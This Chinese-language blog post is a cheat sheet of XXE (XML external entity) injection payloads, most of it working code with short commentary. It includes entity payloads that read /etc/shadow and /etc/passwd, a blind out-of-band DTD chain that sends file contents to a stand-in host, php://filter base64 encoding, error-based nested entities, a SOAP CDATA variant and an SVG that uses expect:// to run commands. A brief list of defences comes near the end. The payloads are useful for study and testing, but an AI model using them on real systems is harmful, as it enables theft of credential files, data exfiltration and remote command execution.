---
layout:     post                    # 使用的布局（不需要改）
title:      xxe的补充-payloads和利用补充               # 标题 
subtitle:   补充一些近来对xxe的学习
date:       2020-04-22              # 时间
author:     z0L1n                      # 作者
header-img: img/post-bg-2015.jpg    #这篇文章标题背景图片
catalog: true                       # 是否归档
tags:                               #标签
    - 基础
---

## 0x00：从payloads来学习：
```
<!--?xml version="1.0" ?-->
<userInfo>
 <firstName>John</firstName>
 <lastName>Doe</lastName>
</userInfo>
```  
该类型的payloads可用于检测xml是否被解析，这是最基本的利用，一般直接在post请求后加入即可，用于有回显的xxe，实属少见了。

```
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
 <userInfo>
  <firstName>John</firstName>
  <lastName>&example;</lastName>
 </userInfo>
```   
该payload引用了内部实体，一般也是常用于可以回显的xxe，一旦xxe解析成功，可以将内部实体转变为外部实体，尝试去测试服务器是否有waf会拦截非正常的出站流量
，还算是简单的利用，如果对方服务器防护措施比较弱，那么我们还是可以轻松的利用。  
## 0x01***接下来就是外部实体注入***
```
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/shadow"> ]>
<userInfo>
 <firstName>John</firstName>
 <lastName>&ent;</lastName>
</userInfo>
-----------------------------------------------------------------
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY % ent SYSTEM "file:///etc/shadow"> ]%ent;>
```
在外部实体注入中，我们可以使用命名实体和参数实体，参数实体多用于blind xxe，这些为简单的外部实体注入，在解析DTD的时候直接会引用外部实体参数，以至于
注入。对于blind xxe来说，我们一般都使用OOB去辨别xml是否解析，用到如以下的payload去建立带外信息通道：  
```
---------------------------------------------------------------------------------
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ELEMENT foo (#ANY)>
<!ENTITY % blind SYSTEM "https://www.example.com/aaa.dtd">%blind;%abc;%send;]>
其中aaa.dtd：
<!ENTITY % xxe SYSTEM "file:///etc/passwd">
<!ENTITY % abc SYSTEM "<!ENTITY &#x25; send SYSTEM "https://www.example.com/?%xxe">">
```
这里使用了外带，我们在下面的外带中要使用三层嵌套才能成功外带，在服务器上的日志即可查看到外带信息，http传输一般在2000个字节以下，所以内容过长的话，
我们可以借助协议来压缩，类似php://filter/read=convert.base64-encode/resource=file:///etc/passwd.另外还有一个方法便是直接使用三层嵌套来报错
回显内容：   
```
    <!ENTITY % para1 SYSTEM "file:///flag">
    <!ENTITY % para '
        <!ENTITY &#x25; para2 "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///&#x25;para1;&#x27;>">
        &#x25;para2;
    '>
    %para;
]>
```   
## 0x02总结：
在xxe的利用中，我们一般进行的是内网渗透、dos攻击、窃取文件信息，如果有php环境以及expect协议的话，还可以进行命令执行，总体来说目前较少出现xxe漏洞，
主要利用的是blind xxe攻击，一般的攻击思路就是测试系统服务器是否能解析通过解析xml来达到我们的攻击目的，在excel等文件中可进行。  
一般的防御措施：（简单）    
1、使用对应语言的xml外部实体注入防御措施    
2、检测过滤<!DOCTYPE、 <!ENTITY、 SYSTEM、 这些关键词    
另外补充一点特殊点的xxe注入：  

```
<soap:Body>
  <foo>
    <![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]>
  </foo>
</soap:Body>
```
```
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
    <image xlink:href="expect://ls"></image>
</svg>
```
